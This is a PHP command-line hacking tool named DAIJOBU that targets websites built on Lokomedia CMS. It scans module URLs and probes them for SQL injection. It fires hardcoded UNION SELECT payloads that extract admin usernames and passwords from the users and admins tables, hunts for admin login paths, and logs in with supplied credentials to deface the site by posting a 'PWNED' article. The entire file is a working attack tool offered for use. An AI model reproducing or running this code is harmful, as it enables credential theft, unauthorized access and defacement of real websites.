<?php
/*
DAIJOBU - Lokomedia CMS Scanner T00Ls
c0ded by : shutdown57
http://alinkoproject.com
LICENSE : http://alinkoproject.com/license.txt
*/
function a_cover(){
@system('clear');
$n="\033[1;37m";
$m="\033[1;31m";
$h="\033[1;32m";
print"
+----------------------------------------------------------------+ 
  $m      _   ___       _    _     _           _      $n                  
  $m     (_) |   \ __ _(_)_ | |___| |__ _  _  (_)     $n
  $m    _ _  | |) / _` | | || / _ \ '_ \ || |  _ _    $n
  $m   (_|_) |___/\__,_|_|\__/\___/_.__/\_,_| (_|_)   $n
  $m                                                  $n
+----------------------------------------------------------------+
|            \033[1;34mScript By : shutdown57 ~ alinkoproject.com    \033[1;37m      |
|                  \033[1;32mLOKOMEDIA CMS SCANNER TOOLS    \033[1;31m               |
+----------------------------------------------------------------+
\n $n
[$h 1 $n] Scan Website
[$h 2 $n] Scan Vulnerable Website
[$h 3 $n] Auto Injection
[$h 4 $n] Find Admin
[$h 5 $n] Auto login & deface
[$h 9 $n] Exit.
";
}
function a_nyeken($url,$m){
@define('c',curl_init());;
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
$o=curl_exec(c);
return preg_match("/".$m."/",$o);
curl_close(c);
}
function a_depes($url){
@define('c',curl_init());
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_FOLLOWLOCATION,1);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt(c,CURLOPT_POST,1);
curl_setopt(c,CURLOPT_POSTFIELDS,array(
	"judul"=>"pwned ? shutdown57",
	"headline"=>"Y",
	"isi_berita"=>"<h1>PWNED ? shutdown57 </h1>",
	));
$o=curl_exec(c);
return preg_match("/pwned/",$o);
curl_close(c);
}
function a_ugh($url,$username,$password){
@define('c',curl_init());
curl_setopt(c,CURLOPT_URL,$url);
curl_setopt(c,CURLOPT_FOLLOWLOCATION,1);
curl_setopt(c,CURLOPT_RETURNTRANSFER,1);
curl_setopt(c,CURLOPT_BINARYTRANSFER,1);
curl_setopt(c,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt(c,CURLOPT_SSL_VERIFYPEER,0);
curl_setopt(c,CURLOPT_SSL_VERIFYHOST,0);
curl_setopt(c,CURLOPT_COOKIEJAR,"cookie_daijobu.txt");
curl_setopt(c,CURLOPT_COOKIEFILE,"cookie_daijobu.txt");
curl_setopt(c,CURLOPT_POST,1);
curl_setopt(c,CURLOPT_POSTFIELDS,array(
	"username"=>$username,
	"password"=>$password,
	));
$o=curl_exec(c);
return preg_match("/Logout/",$o);
curl_close(c);
}
function a_o(){
echo"\033[1;34m @Daijobu/\033[1;32mOptions/ :\033[1;37m"; $o=trim(fgets(STDIN));
#start elseif 1
if($o=="1"){
echo"\033[1;34m @Daijobu/\033[1;32mScan/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));	
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$mod=array("detailberita","detailkategori","detailproduk","detailartikel","halamanstatis","detailalbum");
foreach($mod as $mm){
for($i=1;$i<=200;$i++){
$url=$t."/media.php?module=".$mm."&id=".$i;
if(a_nyeken($url,"404|403|Error|Forbidden|Not Found")){
echo"[".date('H:m:s')."] [\033[1;31m ENOD \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;32m DONE \033[1;37m] $url \n";
}
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
#end elseif 1
}elseif($o=="2"){
echo"\033[1;34m @Daijobu/\033[1;32mVuln/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$mod=array("detailberita","detailkategori","detailproduk","detailartikel","halamanstatis","detailalbum");
foreach($mod as $mm){
for($i=1;$i<=200;$i++){
$url=$t."/media.php?module=".$mm."&id=".$i."'";
if(a_nyeken($url,"mysql_fetch_array|mysql_rows|SQL Syntax")){
echo"[".date('H:m:s')."] [\033[1;32m VULN \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;31m NLUV \033[1;37m] $url \n";
}
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
#end elseif 2
}elseif ($o=="3") {
echo"\033[1;34m @Daijobu/\033[1;32mSQLi/\033[1;31mSet Target Vulnerable/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
if(!preg_match("/=./",$t)){
	echo"Target Should Written Like \033[1;34m http://target.com/media.php?module=detailberita&id=.57 \033[1;37m \n [\033[1;32m add point before id value \033[1;37m ]\n ";
}else{ 
echo "[".date('H:m:s')."] Trying 4 Queries...\n";
$a=array("'union+select+make_set(6,@:=0x0a,(select(1)from(users)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+","'+union+select+concat(username,0x3a574f533a,password)+from+users--+","'+union+select+concat(username,0x3a574f533a,password)+from+admins--+","'union+select+make_set(6,@:=0x0a,(select(1)from(admins)where@:=make_set(511,@,0x23,username,0x3a574f533a,password,0x3c62723e)),@)--+");
foreach($a as $u){
$url=$t.$u;
if(a_nyeken($url,":WOS:")){
echo"[".date('H:m:s')."] [\033[1;32m INJECTED \033[1;37m] $url \n";
}else{
echo"[".date('H:m:s')."] [\033[1;31m DETCEJNI \033[1;37m] $url \n";
}
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();
}
}
# end elseif 3
}elseif ($o=="4") {
echo"\033[1;34m @Daijobu/\033[1;32mFindAdmin/\033[1;31mSet Target/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m RUNNING SCAN... \033[1;34m CTRL+C \033[1;37m For Stop Scanning.. \n\n";
if(!empty($t)){
$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
$adm=array("adminweb/","webadmin/","redaktur/","paneladmin/","adminpanel/","apanel/","redaksi/","laporan/","sysadmin/","minamin/","minadmin/","timadmin/","padmin/","admin/","pakadmin/","ngadimin/","oalah/");
foreach($adm as $a){
$url=$t."/".$a;
if(a_nyeken($url,"username|password|adminpanel|login|masuk")){
echo"[".date('H:m:s')."] [\033[1;32m FOUND \033[1;37m] $url \n"	;
}else{
	echo"[".date('H:m:s')."] [\033[1;31m DNOUF \033[1;37m] $url \n";
}	
}
echo "[".date('H:m:s')."] Stopped !\n";
a_o();	
}
#end elseif 4
}elseif ($o=="5") {
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Target admin page/ :\033[1;37m"; $t=trim(fgets(STDIN));
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Username/ :\033[1;37m"; $u=trim(fgets(STDIN));
echo"\033[1;34m @Daijobu/\033[1;32mLogin&Deface/\033[1;31mSet Password/ :\033[1;37m"; $p=trim(fgets(STDIN));
echo"\n[".date('H:m:s')."]\033[1;32m LOGGIN... \033[1;34m CTRL+C \033[1;37m For Stop.. \n\n";

$t=(!preg_match("/^http:|^https:/",$t)) ? "http://".$t : $t=$t;
if(a_ugh($t,$u,$p)){
echo"[".date('H:m:s')."] \033[1;31m FAILED TO LOGIN, GOMENNASAI.. \n";
}else{
echo"[".date('H:m:s')."] \033[1;32m LOGIN SUCCESSFULLY, \033[1;37m \n";
echo"[".date('H:m:s')."] \033[1;34m DEFACING ON PROCCESS... \033[1;37m \n";
if(a_depes($t."/modul/mod_berita/aksi_berita.php?module=berita&act=input")){
echo"[".date('H:m:s')."] \033[1;32m DEFACE SUCCESSFULLY..\033[1;37m \n";
}else{
echo"[".date('H:m:s')."] \033[1;31m DEFACE FAILED,GOMENNASAI.. \033[1;37m\n";
}
}

}
}

a_cover();
a_o();
